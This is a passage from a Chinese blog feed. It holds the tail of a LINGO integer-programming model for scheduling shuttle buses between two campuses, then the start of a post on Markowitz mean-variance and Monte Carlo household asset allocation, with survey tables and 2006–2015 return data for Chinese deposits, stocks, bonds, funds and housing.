class="line">old_init_num(<span class="built_in">i</span>)&gt;=old_school_sun(<span class="number">1</span>);</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&gt;=<span class="number">0</span>;</span><br><span class="line">old_init_num(<span class="built_in">i</span>)&lt;=<span class="number">20</span>;</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(newweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">new_school(<span class="built_in">i</span>,<span class="built_in">j</span>)&gt;=target_new(<span class="built_in">j</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(oldweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">old_school(<span class="built_in">i</span>,<span class="built_in">j</span>)&gt;=target_old(<span class="built_in">j</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(sat_new(<span class="built_in">i</span>):</span><br><span class="line">new_school_sat(<span class="built_in">i</span>)&gt;=target_new_sat(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_old(<span class="built_in">i</span>) :</span><br><span class="line">old_school_sat(<span class="built_in">i</span>)&gt;=target_old_sat(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(sun_new(<span class="built_in">i</span>):</span><br><span class="line">new_school_sun(<span class="built_in">i</span>)&gt;=target_new_sun(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_old(<span class="built_in">i</span>) :</span><br><span class="line">old_school_sun(<span class="built_in">i</span>)&gt;=target_old_sun(<span class="built_in">i</span>)</span><br><span class="line">);</span><br><span class="line">!对于新校区;</span><br><span class="line">@<span class="keyword">for</span>(days(<span class="built_in">i</span>):</span><br><span class="line">@<span class="keyword">for</span>(new(<span class="built_in">j</span>):</span><br><span class="line">@for(uo(n)|(old_time(n)+1)#le#new_time(j) #and# new_time(j)#lt#(old_time(n+1)+1):</span><br><span class="line">(20-old_init_num(i))+@sum(old(k)|k#le#n:old_school(i,k))-@sum(new(k)|k#lt#j:new_school(i,k))&gt;=new_school(i,j)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_new(<span class="built_in">i</span>):</span><br><span class="line">@for(uo_weekend(j)|(old_sat_time(j)+1)#le#new_sat_time(i) #and# new_sat_time(i) #lt#(old_sat_time(j+1)+1):</span><br><span class="line">(20-old_init_num(6))+@sum(sat_old(k)|k#le#j:old_school_sat(k))-@sum(sat_new(k)|k #lt#i:new_school_sat(k))&gt;=new_school_sat(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_new(<span class="built_in">i</span>):</span><br><span class="line">@for(uo_weekend(j)|(old_sun_time(j)+1)#le#new_sun_time(i) #and# new_sun_time(i) #lt#(old_sun_time(j+1)+1):</span><br><span class="line">(20-old_init_num(7))+@sum(sun_old(k)|k#le#j:old_school_sun(k))-@sum(sun_new(k)|k #lt#i:new_school_sun(k))&gt;=new_school_sun(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">!对于老校区;</span><br><span class="line">@<span class="keyword">for</span>(days(<span class="built_in">i</span>):</span><br><span class="line">@for(old(j)|j#ge#3:</span><br><span class="line">@for(un(n)|(new_time(n)+1)#le#old_time(j) #and# old_time(j)#lt#(new_time(n+1)+1):</span><br><span class="line">old_init_num(i)+@sum(new(s)|s#le#n:new_school(i,s))-@sum(old(s)|s#lt#j:old_school(i,s))&gt;=old_school(i,j)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">@for(sat_old(i)|i#ge#2:</span><br><span class="line">@for(un_weekend(j)|(new_sat_time(j)+1)#le#old_sat_time(i) #and# old_sat_time(i)#lt#(new_sat_time(j+1)+1):</span><br><span class="line">old_init_num(6)+(@sum(sat_new(k)|k#le#j:new_school_sat(k))-@sum(sat_old(k)|k#lt#i:old_school_sat(k)))&gt;=old_school_sat(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@for(sun_old(i)|i#ge#2:</span><br><span class="line">@for(un_weekend(j)|(new_sun_time(j)+1)#le#old_sun_time(i) #and# old_sun_time(i)#lt#(new_sun_time(j+1)+1):</span><br><span class="line">old_init_num(7)+(@sum(sun_new(k)|k#le#j:new_school_sun(k))-@sum(sun_old(k)|k#lt#i:old_school_sun(k)))&gt;=old_school_sun(i)</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span>(dayso(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">1</span>)=old_init_num(<span class="built_in">i</span>)</span><br><span class="line">-@sum(old(<span class="built_in">j</span>):old_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">+@sum(new(<span class="built_in">j</span>):new_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">5</span>)=old_init_num(<span class="number">5</span>)</span><br><span class="line">-@sum(old(<span class="built_in">j</span>):old_school(<span class="number">5</span>,<span class="built_in">j</span>))</span><br><span class="line">+@sum(new(<span class="built_in">j</span>):new_school(<span class="number">5</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">6</span>)=old_init_num(<span class="number">6</span>)</span><br><span class="line">-@sum(sat_old(<span class="built_in">j</span>):old_school_sat(<span class="built_in">j</span>))</span><br><span class="line">+@sum(sat_new(<span class="built_in">j</span>):new_school_sat(<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(mon(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">7</span>)=old_init_num(<span class="number">7</span>)</span><br><span class="line">-@sum(sun_old(<span class="built_in">j</span>):old_school_sun(<span class="built_in">j</span>))</span><br><span class="line">+@sum(sun_new(<span class="built_in">j</span>):new_school_sun(<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(mon(<span class="built_in">i</span>):old_init_num(<span class="built_in">i</span>+<span class="number">7</span>)=old_init_num(<span class="number">1</span>)</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(newweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">@gin(new_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(oldweek(<span class="built_in">i</span>,<span class="built_in">j</span>):</span><br><span class="line">@gin(old_school(<span class="built_in">i</span>,<span class="built_in">j</span>))</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_new(<span class="built_in">i</span>):</span><br><span class="line">@gin(new_school_sat(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sat_old(<span class="built_in">i</span>):</span><br><span class="line">@gin(old_school_sat(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_new(<span class="built_in">i</span>):</span><br><span class="line">@gin(new_school_sun(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line">@<span class="keyword">for</span>(sun_old(<span class="built_in">i</span>):</span><br><span class="line">@gin(old_school_sun(<span class="built_in">i</span>));</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结果演示"><a href="#结果演示" class="headerlink" title="结果演示"></a>结果演示</h1><p><video style="width:700px" src=https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/Lingo_%E6%95%B4%E6%95%B0%E8%A7%84%E5%88%92_%E6%A0%A1%E8%BD%A6%E7%A9%BA%E8%BF%94%E6%9C%80%E4%BC%98%E6%96%B9%E6%A1%88.mp4></video></p><h1 id="说点别的"><a href="#说点别的" class="headerlink" title="说点别的"></a>说点别的</h1><p>通过做这些“任务”，某种程度上来说算是复习当年没学好的知识点，数学建模还是蛮有用的，毕竟是硬核知识，小打小闹赚点零花钱可还行。不过确实是解决问题的利器。</p>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lingo </tag>
            
            <tag> 整数规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Markowitz-蒙特卡洛模型的资产最优配置模型</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8EMarkowitz%E4%B8%8E%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%B5%84%E4%BA%A7%E6%9C%80%E4%BC%98%E9%85%8D%E7%BD%AE%E6%A8%A1%E5%9E%8B/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8EMarkowitz%E4%B8%8E%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%B5%84%E4%BA%A7%E6%9C%80%E4%BC%98%E9%85%8D%E7%BD%AE%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>行为金融学视角下家庭资产配置行为研究，通过均值方差和蒙特卡洛模型算出最合理的资产配置组合，实证部分内容，这两个模型都是算出来家庭资产配置最优组合</p><p>注：本文基于文献《行为金融学视角下城镇家庭资产配置的非理性行为研究》进行算法的研究与模型的建立。文献与算法代码见</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>详细内容参照上述文献即可</p><p><a href="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/file_for_post/%E9%A9%AC%E7%A7%91%E7%BB%B4%E8%8C%A8-%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B%E9%87%91%E8%9E%8D%E8%B5%84%E4%BA%A7%E9%85%8D%E7%BD%AE.zip">https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/file_for_post/%E9%A9%AC%E7%A7%91%E7%BB%B4%E8%8C%A8-%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B%E9%87%91%E8%9E%8D%E8%B5%84%E4%BA%A7%E9%85%8D%E7%BD%AE.zip</a></p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="1、通俗理解协方差"><a href="#1、通俗理解协方差" class="headerlink" title="1、通俗理解协方差"></a>1、通俗理解协方差</h3><p>协方差概念：可以通俗的理解为：<strong>两个变量在变化过程中是同方向变化？还是反方向变化？同向或反向程度如何？</strong></p><p>参考链接：如何通俗易懂地解释「协方差」与「相关系数」的概念？ - GRAYLAMB的回答 - 知乎 <a href="https://www.zhihu.com/question/20852004/answer/134902061">https://www.zhihu.com/question/20852004/answer/134902061</a></p><h3 id="2、马科维兹的均值-方差模型"><a href="#2、马科维兹的均值-方差模型" class="headerlink" title="2、马科维兹的均值-方差模型"></a>2、马科维兹的均值-方差模型</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171308855.png" alt="image-20210601171308855"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171329950.png" alt="image-20210601171329950"></p><p>参考链接 <a href="https://blog.csdn.net/qcyfred/article/details/70670091">https://blog.csdn.net/qcyfred/article/details/70670091</a></p><h3 id="3、蒙特卡洛"><a href="#3、蒙特卡洛" class="headerlink" title="3、蒙特卡洛"></a>3、蒙特卡洛</h3><p>基本原理：</p><p><a href="https://blog.csdn.net/u013414501/article/details/50478898/">https://blog.csdn.net/u013414501/article/details/50478898/</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171349044.png" alt="image-20210601171349044"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171411357.png" alt="image-20210601171411357"></p><h3 id="Matlab的GUI编写简介"><a href="#Matlab的GUI编写简介" class="headerlink" title="Matlab的GUI编写简介"></a>Matlab的GUI编写简介</h3><h4 id="界面排版"><a href="#界面排版" class="headerlink" title="界面排版"></a>界面排版</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171444499.png" alt="image-20210601171444499"></p><h4 id="1、两个回调函数"><a href="#1、两个回调函数" class="headerlink" title="1、两个回调函数"></a>1、两个回调函数</h4><p><strong>Callback</strong> 与 <strong>ButtonDownFcn</strong>GUI 设计中容易混淆的两个回调函数，在触控按钮（Push Button）、静态文本（Static Text）、切换按钮（Toggle  Button）、滑动条（Slider）等控件中均有这两个函数（也叫“属性”）。下面仅以 Push Button 为例进行说明。    两函数的调用要涉及的另一个用于使能或禁用控件的属性 <strong>Enable</strong>，此属性包含三个可选值：{<strong>on</strong>}、off、inactive，on 为默认属性。当 <strong>Enable</strong> 为 <strong>on</strong> 时，在 Push Button上单击左键时，调用 <strong>Callback</strong> 函数，单击右键时，调用 <strong>ButtonDownFcn</strong> 函数。在 Push Button <strong>周围5像素范围内</strong>单击左键或右键，不论 <strong>Enable</strong> 取何值，都将调用 <strong>ButtonDownFcn</strong> 函数。可见，当 <strong>Enable</strong> 为 <strong>on</strong> 时，可以实现单击左键、右键有不同的响应。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171458308.png" alt="image-20210601171458308"></p><h4 id="2、GUI中的OpeningFcn和OutputFcn函数作用"><a href="#2、GUI中的OpeningFcn和OutputFcn函数作用" class="headerlink" title="2、GUI中的OpeningFcn和OutputFcn函数作用"></a>2、GUI中的OpeningFcn和OutputFcn函数作用</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171510423.png" alt="image-20210601171510423"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601171519655.png" alt="image-20210601171519655"></p><h2 id="原始数据与预处理"><a href="#原始数据与预处理" class="headerlink" title="原始数据与预处理"></a>原始数据与预处理</h2><h3 id="1-1-问卷设计与数据回收"><a href="#1-1-问卷设计与数据回收" class="headerlink" title="1.1 问卷设计与数据回收"></a>1.1 问卷设计与数据回收</h3><p>调查问卷量表题设置</p><table><thead><tr><th>非理性行为</th><th>量表题设置</th></tr></thead><tbody><tr><td>锚定效应</td><td>1.您会购买给您留下好印象的股票</td></tr><tr><td></td><td>2.您不会购买出现过负面新闻的股票</td></tr><tr><td></td><td>3.您会放弃收益不佳的基金</td></tr><tr><td></td><td>4.您会一直购买连续盈利的银行理财产品</td></tr><tr><td>过度自信</td><td>5.您在投资的时候会听取家人或专业人士的意见</td></tr><tr><td></td><td>6.当您购买的股票大涨的时候，您会将原因归于自己的远见和能力</td></tr><tr><td></td><td>7.当您购买的股票大跌的时候，您会将原因归结于市场不景气</td></tr><tr><td></td><td>8.您的投资水平比大多数人都要高</td></tr><tr><td>心理账户</td><td>9.您同时进行了股票、债券和房地产等几项投资，总体收益不佳，但仍会因为房价上涨而满意</td></tr><tr><td></td><td>10.您同时进行了债券和基金等几项的投资，总体收益良好，但仍会因为股票亏损而沮丧</td></tr><tr><td>羊群效应</td><td>11.您会购买媒体一直宣传的热门理财产品</td></tr><tr><td></td><td>12.购买股票时，您会选择热销的股票</td></tr><tr><td></td><td>13.若您身边的朋友、亲戚购买的股票连续大涨，您也会考虑买入这只股票</td></tr><tr><td>模糊厌恶</td><td>14.购买理财产品时候，您更愿意在自己常去的银行购买</td></tr><tr><td></td><td>15.购买股票时，您更愿意选择自己熟悉的公司</td></tr><tr><td></td><td>16.您认为新兴金融产品风险大，所以不会轻易购买</td></tr></tbody></table><p>问卷基本情况：</p><table><thead><tr><th>项目</th><th align="left">分类</th><th>数量</th><th>百分比</th></tr></thead><tbody><tr><td>性别</td><td align="left">男</td><td>328</td><td>49.4%</td></tr><tr><td></td><td align="left">女</td><td>336</td><td>50.60%</td></tr><tr><td>年龄</td><td align="left">20岁及以下</td><td>6</td><td>0.90%</td></tr><tr><td></td><td align="left">21-30岁</td><td>252</td><td>37.95%</td></tr><tr><td></td><td align="left">31-40岁</td><td>208</td><td>31.33%</td></tr><tr><td></td><td align="left">41-50岁</td><td>180</td><td>27.11%</td></tr><tr><td></td><td align="left">51-60岁</td><td>16</td><td>2.41%</td></tr><tr><td></td><td align="left">60岁及以上</td><td>2</td><td>0.30%</td></tr><tr><td>家庭情况</td><td align="left">有小孩</td><td>400</td><td>60.24%</td></tr><tr><td></td><td align="left">无小孩</td><td>264</td><td>39.76%</td></tr><tr><td>教育程度</td><td align="left">初中及以下</td><td>12</td><td>1.81%</td></tr><tr><td></td><td align="left">高中/中专</td><td>36</td><td>5.42%</td></tr><tr><td></td><td align="left">大专</td><td>154</td><td>23.19%</td></tr><tr><td></td><td align="left">大学本科</td><td>332</td><td>50.00%</td></tr><tr><td></td><td align="left">硕士及以上</td><td>130</td><td>19.58%</td></tr><tr><td>职业</td><td align="left">公务员</td><td>26</td><td>3.92%</td></tr><tr><td></td><td align="left">事业单位和民间社团工作人员</td><td>42</td><td>6.33%</td></tr><tr><td></td><td align="left">企业管理人员</td><td>40</td><td>6.02%</td></tr><tr><td></td><td align="left">专业技术人员</td><td>162</td><td>24.40%</td></tr><tr><td></td><td align="left">一般职员</td><td>170</td><td>25.60%</td></tr><tr><td></td><td align="left">工人及商业服务人员</td><td>68</td><td>10.24%</td></tr><tr><td></td><td align="left">私营业主及个体工商户</td><td>12</td><td>1.81%</td></tr><tr><td></td><td align="left">学生</td><td>98</td><td>14.76%</td></tr><tr><td></td><td align="left">金融行业从业者</td><td>38</td><td>5.72%</td></tr><tr><td></td><td align="left">其他</td><td>8</td><td>1.20%</td></tr><tr><td>家庭月平均收入</td><td align="left">1000以下（含1000）</td><td>22</td><td>3.31%</td></tr><tr><td></td><td align="left">1000-2000（含2000）</td><td>30</td><td>4.52%</td></tr><tr><td></td><td align="left">2000-4000（含4000）</td><td>120</td><td>18.07%</td></tr><tr><td></td><td align="left">4000-6000（含6000）</td><td>90</td><td>13.55%</td></tr><tr><td></td><td align="left">6000-8000（含8000）</td><td>92</td><td>13.86%</td></tr><tr><td></td><td align="left">8000-10000（含10000）</td><td>104</td><td>15.66%</td></tr><tr><td></td><td align="left">10000-20000（含20000）</td><td>98</td><td>14.76%</td></tr><tr><td></td><td align="left">20000-50000（含50000）</td><td>106</td><td>15.96%</td></tr><tr><td></td><td align="left">50000以上</td><td>2</td><td>0.31%</td></tr><tr><td>风险态度</td><td align="left">风险偏好</td><td>222</td><td>33.43%</td></tr><tr><td></td><td align="left">风险厌恶</td><td>442</td><td>66.57%</td></tr></tbody></table><h3 id="1-2-收益率数据收集与处理"><a href="#1-2-收益率数据收集与处理" class="headerlink" title="1.2 收益率数据收集与处理"></a>1.2 收益率数据收集与处理</h3><h4 id="1-2-1-银行存款收益率"><a href="#1-2-1-银行存款收益率" class="headerlink" title="1.2.1 银行存款收益率"></a>1.2.1 银行存款收益率</h4><p>银行存款收益率：2004—2015我国银行存款利率变动情况 </p><table><thead><tr><th>调整时间</th><th>活期存款利率（%）</th><th>定期存款利率（%）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td>三个月</td><td>六个月</td><td>一年</td><td>二年</td><td>三年</td><td>五年</td></tr><tr><td>2006.08.19</td><td>0.72</td><td>1.80</td><td>2.25</td><td>2.52</td><td>3.06</td><td>3.69</td><td>4.14</td></tr><tr><td>2007.03.18</td><td>0.72</td><td>1.98</td><td>2.43</td><td>2.79</td><td>3.33</td><td>3.96</td><td>4.41</td></tr><tr><td>2007.05.19</td><td>0.72</td><td>2.07</td><td>2.61</td><td>3.06</td><td>3.69</td><td>4.41</td><td>4.95</td></tr><tr><td>2007.07.21</td><td>0.81</td><td>2.34</td><td>2.88</td><td>3.33</td><td>3.96</td><td>4.68</td><td>5.22</td></tr><tr><td>2007.08.22</td><td>0.81</td><td>2.61</td><td>3.15</td><td>3.60</td><td>4.23</td><td>4.95</td><td>5.49</td></tr><tr><td>2007.09.15</td><td>0.81</td><td>2.88</td><td>3.42</td><td>3.87</td><td>4.50</td><td>5.22</td><td>5.76</td></tr><tr><td>2007.12.21</td><td>0.72</td><td>3.33</td><td>3.78</td><td>4.14</td><td>4.68</td><td>5.40</td><td>5.85</td></tr><tr><td>2008.10.09</td><td>0.72</td><td>3.15</td><td>3.51</td><td>3.87</td><td>4.41</td><td>5.13</td><td>5.58</td></tr><tr><td>2008.10.30</td><td>0.72</td><td>2.88</td><td>3.24</td><td>3.60</td><td>4.14</td><td>4.77</td><td>5.13</td></tr><tr><td>2008.11.27</td><td>0.36</td><td>1.98</td><td>2.25</td><td>2.52</td><td>3.06</td><td>3.60</td><td>3.87</td></tr><tr><td>2008.12.23</td><td>0.36</td><td>1.98</td><td>2.25</td><td>2.52</td><td>3.06</td><td>3.60</td><td>3.87</td></tr><tr><td>2010.10.20</td><td>0.36</td><td>1.91</td><td>2.20</td><td>2.50</td><td>3.25</td><td>3.85</td><td>4.20</td></tr><tr><td>2010.12.26</td><td>0.36</td><td>2.25</td><td>2.50</td><td>2.75</td><td>3.55</td><td>4.15</td><td>4.55</td></tr><tr><td>2011.02.09</td><td>0.40</td><td>2.60</td><td>2.80</td><td>3.00</td><td>3.90</td><td>4.50</td><td>5.00</td></tr><tr><td>2011.04.06</td><td>0.50</td><td>2.85</td><td>3.05</td><td>3.25</td><td>4.15</td><td>4.75</td><td>5.25</td></tr><tr><td>2011.07.07</td><td>0.50</td><td>3.10</td><td>3.30</td><td>3.50</td><td>4.40</td><td>5.00</td><td>5.50</td></tr><tr><td>2012.06.08</td><td>0.44</td><td>3.10</td><td>3.30</td><td>3.50</td><td>4.10</td><td>4.65</td><td>5.10</td></tr><tr><td>2012.07.06</td><td>0.35</td><td>2.85</td><td>3.05</td><td>3.25</td><td>3.75</td><td>4.25</td><td>4.75</td></tr><tr><td>2014.11.22</td><td>0.35</td><td>2.60</td><td>2.80</td><td>3.00</td><td>3.50</td><td>4.00</td><td>4.25</td></tr><tr><td>2015.03.01</td><td>0.35</td><td>2.35</td><td>2.55</td><td>2.75</td><td>3.25</td><td>3.75</td><td>4.00</td></tr><tr><td>2015.05.11</td><td>0.35</td><td>2.10</td><td>2.30</td><td>2.50</td><td>3.00</td><td>3.50</td><td>3.75</td></tr><tr><td>2015.06.28</td><td>0.35</td><td>1.85</td><td>2.05</td><td>2.25</td><td>2.75</td><td>3.25</td><td>3.35</td></tr><tr><td>2015.08.26</td><td>0.35</td><td>1.60</td><td>1.80</td><td>2.00</td><td>2.50</td><td>3.00</td><td>3.05</td></tr><tr><td>2015.10.24</td><td>0.30</td><td>1.35</td><td>1.55</td><td>1.75</td><td>2.25</td><td>2.75</td><td>2.75</td></tr></tbody></table><p>银行存款收益率计算</p><p>对应表5-2 增加了2015年的数据</p><p>2015年银行存款年平均收益率(%)=</p><p>(0.35+2.60+2.80+3.00+3.50+4.00+4.25) /7/12*3+</p><p>(0.35+2.35+2.55+2.75+3.25+3.75+4.00) /7/12*2+</p><p>(0.35+2.10+2.30+2.50+3.00+3.50+3.75) /7/12*1+</p><p>(0.35+1.85+2.05+2.25+2.75+3.25+3.35) /7/12*2+</p><p>(0.35+1.60+1.80+2.00+2.50+3.00+3.05) /7/12*2+</p><p>(0.30+1.35+1.55+1.75+2.25+2.75+2.75) /7/12*2=2.4131</p><p>2006-2015银行存款年平均收益率</p><table><thead><tr><th>年度</th><th>平均收益率</th><th>年度</th><th>平均收益率</th></tr></thead><tbody><tr><td>2006</td><td>——</td><td>2011</td><td>3.36%</td></tr><tr><td>2007</td><td>3.15%</td><td>2012</td><td>3.42%</td></tr><tr><td>2008</td><td>3.83%</td><td>2013</td><td>3.18%</td></tr><tr><td>2009</td><td>2.52%</td><td>2014</td><td>3.16%</td></tr><tr><td>2010</td><td>2.52%</td><td>2015</td><td>2.41%</td></tr></tbody></table><p>则从2006至2015年来，我国银行存款平均收益率</p><p>=(3.15+3.83+2.52+2.52+3.36+3.42+3.18+3.16+2.41)/9=3.06%</p><h4 id="1-2-2-股票收益率"><a href="#1-2-2-股票收益率" class="headerlink" title="1.2.2 股票收益率"></a>1.2.2 股票收益率</h4><p>股票收益率：2006—2015上证指数年收盘价及股票年平均收益率</p><table><thead><tr><th>年度</th><th>上证指数收盘价</th><th>年平均收益率</th></tr></thead><tbody><tr><td>2006</td><td>2675.47</td><td>——</td></tr><tr><td>2007</td><td>5261.56</td><td>96.66%</td></tr><tr><td>2008</td><td>1820.81</td><td>-65.39%</td></tr><tr><td>2009</td><td>3277.14</td><td>79.98%</td></tr><tr><td>2010</td><td>2808.08</td><td>-14.31%</td></tr><tr><td>2011</td><td>2199.42</td><td>-21.68%</td></tr><tr><td>2012</td><td>2269.13</td><td>3.17%</td></tr><tr><td>2013</td><td>2115.98</td><td>-6.75%</td></tr><tr><td>2014</td><td>3234.68</td><td>52.87%</td></tr><tr><td>2015</td><td>3052.78</td><td>-5.62%</td></tr></tbody></table><h4 id="1-2-3-债券收益率"><a href="#1-2-3-债券收益率" class="headerlink" title="1.2.3 债券收益率"></a>1.2.3 债券收益率</h4><p>债券的收益率：2006—2015中债—新综合指数及债券年平均收益率</p><table><thead><tr><th>年度</th><th>中债——新综合指数</th><th>年平均收益率</th></tr></thead><tbody><tr><td>2006</td><td>116.1421</td><td>2.42%</td></tr><tr><td>2007</td><td>116.1804</td><td>0.03%</td></tr><tr><td>2008</td><td>128.3216</td><td>10.45%</td></tr><tr><td>2009</td><td>128.5032</td><td>0.14%</td></tr><tr><td>2010</td><td>131.0211</td><td>1.96%</td></tr><tr><td>2011</td><td>137.7031</td><td>5.10%</td></tr><tr><td>2012</td><td>142.7568</td><td>3.67%</td></tr><tr><td>2013</td><td>142.3383</td><td>-0.29%</td></tr><tr><td>2014</td><td>157.0586</td><td>10.34%</td></tr><tr><td>2015</td><td>169.9023</td><td>8.18%</td></tr></tbody></table><h4 id="1-2-4-基金收益率"><a href="#1-2-4-基金收益率" class="headerlink" title="1.2.4 基金收益率"></a>1.2.4 基金收益率</h4><p>基金收益率：2006—2015沪深两市基金指数及其加权平均数</p><table><thead><tr><th>年度</th><th>沪市基金指数</th><th>深市基金指数</th><th>加权平均基金指数</th><th>年平均收益率</th></tr></thead><tbody><tr><td>2006</td><td>2090.52</td><td>1997.62</td><td>2044.07</td><td>——</td></tr><tr><td>2007</td><td>5070.79</td><td>4977.27</td><td>5024.03</td><td>145.79%</td></tr><tr><td>2008</td><td>2512.49</td><td>2626.25</td><td>2569.37</td><td>-48.86%</td></tr><tr><td>2009</td><td>4765.75</td><td>4720.45</td><td>4743.10</td><td>84.60%</td></tr><tr><td>2010</td><td>4557.66</td><td>5655.98</td><td>5106.82</td><td>7.67%</td></tr><tr><td>2011</td><td>3592.26</td><td>4274.31</td><td>3933.29</td><td>-22.98%</td></tr><tr><td>2012</td><td>3921.09</td><td>4567.49</td><td>4244.29</td><td>7.91%</td></tr><tr><td>2013</td><td>3880.27</td><td>4967.74</td><td>4428.51</td><td>4.34%</td></tr><tr><td>2014</td><td>5550.63</td><td>6216.27</td><td>5883.45</td><td>32.85%</td></tr><tr><td>2015</td><td>5904.92</td><td>8278.72</td><td>7091.82</td><td>20.54%</td></tr></tbody></table><h4 id="1-2-5-房产收益率"><a href="#1-2-5-房产收益率" class="headerlink" title="1.2.5 房产收益率"></a>1.2.5 房产收益率</h4><p>房产的收益率：2006—2015商品房销售额、销售面积及平均销售价格</p><table><thead><tr><th>年度</th><th>商品房销售额  （亿元）</th><th>商品房销售面积（万平方米）</th><th>平均销售价格  （元/平方米）</th><th>平均收益率</th></tr></thead><tbody><tr><td>2006</td><td>20826.00</td><td>61857.00</td><td>3366.80</td><td>——</td></tr><tr><td>2007</td><td>29889.10</td><td>77355.00</td><td>3863.89</td><td>14.76%</td></tr><tr><td>2008</td><td>25068.20</td><td>65970.00</td><td>3799.94</td><td>-1.66%</td></tr><tr><td>2009</td><td>44355.20</td><td>94755.00</td><td>4681.04</td><td>23.19%</td></tr><tr><td>2010</td><td>52721.20</td><td>104765.00</td><td>5032.33</td><td>7.50%</td></tr><tr><td>2011</td><td>59119.10</td><td>109946.00</td><td>5377.10</td><td>6.85%</td></tr><tr><td>2012</td><td>64456.00</td><td>111300.00</td><td>5791.19</td><td>7.70%</td></tr><tr><td>2013</td><td>81428.00</td><td>130.551.00</td><td>6237.26</td><td>7.70%</td></tr><tr><td>2014</td><td>76292.00</td><td>120649.00</td><td>6323.47</td><td>1.38%</td></tr><tr><td>2015</td><td>87281.00</td><td>128495.00</td><td>6792.56</td><td>7.42%</td></tr></tbody></table><hr><h2 id="模型-算法-结果"><a href="#模型-算法-结果" class="headerlink" title="模型-算法-结果"></a>模型-算法-结果</h2><h3 id="2-1-均值-方差原始模型（不考虑交易成本）-参考文献5-2-2"><a href="#2-1-均值-方差原始模型（不考虑交易成本）-参考文献5-2-2" class="headerlink" title="2.1 均值-方差原始模型（不考虑交易成本）-参考文献5.2.2"></a>2.1 均值-方差原始模型（不考虑交易成本）-参考文献5.2.2</h3><p>​                        </p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601163014139.png" alt="image-20210601163014139"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210601165353153.png" 